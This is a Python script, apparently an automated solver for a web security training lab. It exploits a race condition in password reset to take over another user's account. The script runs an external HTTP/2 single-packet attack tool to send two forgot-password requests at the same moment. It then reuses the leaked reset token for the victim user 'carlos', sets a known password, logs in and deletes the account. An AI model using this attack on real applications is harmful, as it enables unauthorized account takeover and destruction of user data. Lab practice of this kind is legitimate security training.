import requests
import re
import sys
import shlex
import subprocess


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.email_client_url = None
        self.session_one = requests.Session()
        self.session_two = requests.Session()

    def get_csrf_token(self, session, endpoint):
        response = session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def get_email_client_url(self, session):
        response = session.get(self.lab_url)
        self.email_client_url = re.search('(https://exploit-.*?)\'>', response.text).group(1)

    def generate_two_reset_tokens(self):
        self.session_two.get(self.lab_url)

        hostname = self.lab_url.split('https://')[1].strip('/')

        cookie_header_one = 'Cookie: phpsessionid={}'.format(self.session_one.cookies.get('phpsessionid'))
        cookie_header_two = 'Cookie: phpsessionid={}'.format(self.session_two.cookies.get('phpsessionid'))

        csrf_one = self.get_csrf_token(self.session_one, 'forgot-password')
        csrf_two = self.get_csrf_token(self.session_two, 'forgot-password')

        # https://github.com/ma4747gh/H2SinglePacketAttacker
        found = False
        while not found:
            command = (('python /home/ma4747gh/Desktop/GitHub/H2SinglePacketAttacker/h2_single_packet_attacker.py {} 443 --tls_channel --streams 2 '
                       '--method POST --path /forgot-password --data \'csrf={}&username={}\' --header \'{}\' '
                       '--header \'break\' --method POST --path /forgot-password --data \'csrf={}&username={}\' '
                       '--header \'{}\' --header \'break\' --multiple_endpoint_mode')
                       .format(hostname, csrf_one, 'wiener', cookie_header_one, csrf_two, 'carlos', cookie_header_two))

            args = shlex.split(command)
            print(subprocess.run(args).stdout)

            confirmation_link = self.get_latest_email().replace('wiener', 'carlos')

            if self.reset_carlos_password(confirmation_link):
                found = True

    def get_latest_email(self):
        response = self.session_one.get(self.email_client_url)
        confirmation_link = re.search(r'({}forgot-password\?user=wiener&token=.*?)\''.format(self.lab_url), response.text).group(1)
        return confirmation_link

    def reset_carlos_password(self, confirmation_link):
        response = self.session_one.get(confirmation_link)
        if response.status_code != 200:
            return False
        else:
            csrf = re.search(r'name="csrf" value="(.*)"', response.text).group(1)
            token = re.search(r'name=\'token\' value=\'(.*)\'', response.text).group(1)

            data = {
                'csrf': csrf,
                'token': token,
                'user': 'carlos',
                'new-password-1': 'hacker',
                'new-password-2': 'hacker'
            }
            self.session_one.post(confirmation_link, data=data)
            return True

    def sign_in_as_carlos_and_delete_him(self):
        data = {
            'csrf': self.get_csrf_token(self.session_one, 'login'),
            'username': 'carlos',
            'password': 'hacker'
        }
        self.session_one.post(self.lab_url + 'login', data=data)

        self.session_one.get(self.lab_url + 'admin/delete?username=carlos')

    def check_solution(self):
        response = self.session_one.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_email_client_url(self.session_one)
        self.generate_two_reset_tokens()
        self.sign_in_as_carlos_and_delete_him()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
